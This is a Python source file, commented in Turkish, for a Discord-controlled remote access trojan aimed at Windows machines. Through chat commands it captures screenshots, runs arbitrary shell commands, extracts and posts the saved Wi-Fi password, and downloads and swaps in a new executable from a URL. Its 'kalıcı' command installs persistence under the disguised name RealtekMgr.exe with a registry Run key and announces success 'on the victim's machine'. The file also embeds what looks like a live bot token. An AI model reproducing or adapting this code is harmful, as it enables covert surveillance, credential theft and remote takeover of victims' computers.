import discord
from discord.ext import commands
import subprocess
import re
import asyncio
import pyautogui
import io
import sys
import os
import shutil
import requests

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} çalışmaya hazır!')

@bot.command()
async def ss(ctx):
    # Ekranın sol üst köşesinden sağ alt köşesine kadar olan alanı al
    screenshot = pyautogui.screenshot()

    # Görüntüyü bir BytesIO nesnesine kaydet
    image_bytes = io.BytesIO()
    screenshot.save(image_bytes, format='PNG')
    image_bytes.seek(0)

    # BytesIO nesnesini kullanarak Discord'a gönderilecek bir File nesnesi oluştur
    file = discord.File(image_bytes, filename='screenshot.png')

    # Komutun kullanıldığı kanala ekran görüntüsünü gönder
    await ctx.send(file=file)

    # BytesIO nesnesini kapat
    image_bytes.close()

@bot.command()
async def chrome(ctx, url=None):
    # Chrome uygulama yolu (kendi bilgisayarınızdaki uygun yolu belirtin)
    chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

    # Eğer URL belirtilmişse, Chrome'u belirtilen URL ile aç
    if url:
        try:
            subprocess.run([chrome_path, url], check=True)
            await ctx.send(f"Chrome başarıyla açıldı: {url}")
        except subprocess.CalledProcessError:
            await ctx.send("Chrome'u açarken bir hata oluştu.")
    else:
        await ctx.send("URL belirtilmedi. Lütfen bir URL ekleyin.")

@bot.command()
async def cmd(ctx, *, komut):
    # Komutu çalıştır
    try:
        subprocess.run(komut, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        await ctx.send(f"Komut başarıyla çalıştırıldı:\n```\n{komut}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Hata oluştu:\n```\n{e.stderr}\n```")

@bot.command()
async def yaz(ctx):
    # Mesajları al ve birleştir
    messages = await ctx.channel.history(limit=10).flatten()
    content = "\n".join(message.content for message in messages[::-1])

    # Birleştirilmiş mesajları gönder
    await ctx.send(f"Önceki 10 mesaj:\n```\n{content}\n```")

@bot.command()
async def wifi(ctx):
    # Anlık olarak bağlı olan WiFi ağının adını ve şifresini al
    wifi_name, wifi_password = get_connected_wifi_info()

    if wifi_name and wifi_password:
        await ctx.send(f"**Bağlı WiFi Ağı**:||{wifi_name}||\n**WiFi Şifresi:** ||{wifi_password}||")
    else:
        await ctx.send("Bağlı WiFi ağı bulunamadı veya bilgi alınamadı.")

def get_connected_wifi_info():
    try:
        # Şu anki WiFi ağını al
        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], capture_output=True, text=False)
        output_lines = result.stdout.split(b'\r\n')

        for line in output_lines:
            line = line.decode('cp1254', errors='ignore')
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
                # WiFi ağı için profil adını kullanarak şifreyi al
                password_result = subprocess.run(['netsh', 'wlan', 'show', 'profile', 'name=', ssid, 'key=clear'], capture_output=True, text=False)
                password_output = password_result.stdout
                password_output = password_output.decode('cp1254', errors='ignore')
                # Şifreyi bir regex ile çıkar
                match = re.search(r'Key Content\s*:\s*(.*)', password_output)
                if match:
                    password = match.group(1).strip()
                    return ssid, password

    except Exception as e:
        print(f"Hata: {e}")

    return None, None

@bot.command()
async def sil(ctx, sayi: int):
    try:
        # Belirtilen sayı kadar mesajı sil
        await ctx.channel.purge(limit=sayi + 1)
        silindi_mesaji = await ctx.send(f"**{sayi} mesaj başarıyla silindi.**")

        # 10 saniye sonra silindi_mesaji'ni sil
        await asyncio.sleep(10)
        await silindi_mesaji.delete()
    except Exception as e:
        await ctx.send(f"**Mesaj silme işlemi sırasında bir hata oluştu: {e}**")

async def kodlar(ctx):
    # Komutları ve açıklamalarını listele
    embed = discord.Embed(title="Komutlar", description="Aşağıda mevcut komutları bulabilirsiniz.", color=0x00ff00)

    embed.add_field(name="**!ss**", value="Ekran görüntüsü alır ve Discord'a gönderir.", inline=False)
    embed.add_field(name="**!chrome [URL]**", value="Belirtilen URL ile Chrome'u açar.", inline=False)
    embed.add_field(name="**!cmd [komut]**", value="Belirtilen komutu çalıştırır.", inline=False)
    embed.add_field(name="**!yaz**", value="Önceki 10 mesajı birleştirip gönderir.", inline=False)
    embed.add_field(name="**!wifi**", value="Bağlı olan WiFi ağının adını ve şifresini gönderir.", inline=False)
    embed.add_field(name="**!sil [sayi]**", value="Belirtilen sayı kadar mesajı siler.", inline=False)
    embed.add_field(name="**!uptade**", value="Yeni dosya ile anlık dosyanın kodlarını değiştirir.", inline=False)
    embed.add_field(name="**!izin**", value="Çalışan dosyanın kendisine yazma izni verir.", inline=False)
    embed.add_field(name="**!exit**", value="Botu kapatır (sadece belirli bir kullanıcı kullanabilir).", inline=False)
    embed.add_field(name="**!update [dosya_yolu]**", value="Botu günceller ve yeniden başlatır (sadece belirli bir kullanıcı kullanabilir).", inline=False)
    embed.add_field(name="**!cmd [komut]**", value="Belirtilen komutu çalıştırır ve çıktısını Discord'a gönderir.", inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def exit(ctx):
    # Çıkış komutunu sadece belirli bir kullanıcı kullanabilir
    if ctx.author.id == 686890243881828421:  # Kullanıcı kimliğinizi buraya ekleyin
        await ctx.send("**Bot kapatılıyor...**")
        await bot.close()
    else:
        await ctx.send("*Bu komutu kullanma izniniz yok!*")     

@bot.command()
async def updatebot(ctx, *, new_executable_url: str):
    # Check if the user is authorized to perform the update
    if ctx.author.id == 686890243881828421:  # Replace with your user ID
        try:
            # Download the new executable from the provided URL
            response = requests.get(new_executable_url, stream=True)
            response.raise_for_status()

            # Save the new executable to a temporary file
            temp_executable_path = "temp_bot_update.exe"
            with open(temp_executable_path, 'wb') as temp_file:
                for chunk in response.iter_content(chunk_size=8192):
                    temp_file.write(chunk)

            # Replace the existing executable with the new one
            current_executable_path = os.path.abspath(__file__)
            shutil.move(temp_executable_path, current_executable_path)

            # Inform the user about the successful update
            await ctx.send("**Bot has been updated successfully. Restarting...**")

            # Restart the bot (you may need to modify this based on your deployment method)
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as e:
            await ctx.send(f"**Error updating bot: {e}**")
    else:
        await ctx.send("**You are not authorized to use this command!**")

@bot.command()
async def run_cmd(ctx, *, komut):
    # Komutu çalıştır
    try:
        result = subprocess.run(komut, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout if result.stdout else result.stderr

        # Çıktıyı Discord'a gönder
        await ctx.send(f"Komut başarıyla çalıştırıldı:\n```\n{komut}\n```\nÇıktı:\n```\n{output}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Hata oluştu:\n```\n{e.stderr}\n```")
        
@bot.command()
async def yenile(ctx):
    try:
        # Çalışan botu kapat
        await ctx.send("Bot kapatılıyor...")
        await bot.close()
        
        # Yeni bir event loop oluştur
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        
        # Bot'u tekrar başlat
        current_executable_path = os.path.abspath(__file__)
        os.execl(sys.executable, sys.executable, current_executable_path)
    except Exception as e:
        print(f"Hata: {e}")

@bot.command()
async def kalıcı(ctx, option='help'):
    if option == 'permanent':
        try:
            os.mkdir(f'{os.environ["APPDATA"]}\\Microsoft\\Essentials')
        except FileExistsError:
            pass

        # Dosya yolu ve adını burada güncelleyin
        file_name = "exe.py"  # Gerçek dosya adını buraya ekleyin
        file_path = r'C:\Users\Megag\OneDrive\Masaüstü\sub7'  # Dosya yolunu buraya ekleyin

        # Dosya yolunu ve adını birleştirin
        pathoffile = os.path.abspath(os.path.join(file_path, file_name))

        destination_path = f'{os.environ["APPDATA"]}\\Microsoft\\Essentials\\RealtekMgr.exe'

        # Dosyayı kopyala ve adını değiştir
        shutil.copyfile(pathoffile, destination_path)

        # RealtekMgr, sub7 tarafından base32 ile kodlanmıştır
        os.system(f'REG Add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /ve /d "{destination_path}" /f ')
        await ctx.send("<:yes:1143254324198256743> `Successfully became permanent on the victim's machine`")
    elif option == 'help':
        # Yardım mesajını gönder
        await ctx.send("Help message for the kalıcı command.")
    else:
        await ctx.send("Invalid option.")

# Botu çalıştır
bot.run('MTE3MjU4MDE3OTU1MDQwNDYzOA.GnYvoa.0g7-jFYrL6U9v98QuRgdSsc9vjrfRARGeLWowo')  # Kullanılacak gerçek bir bot token'i ile değiştirin
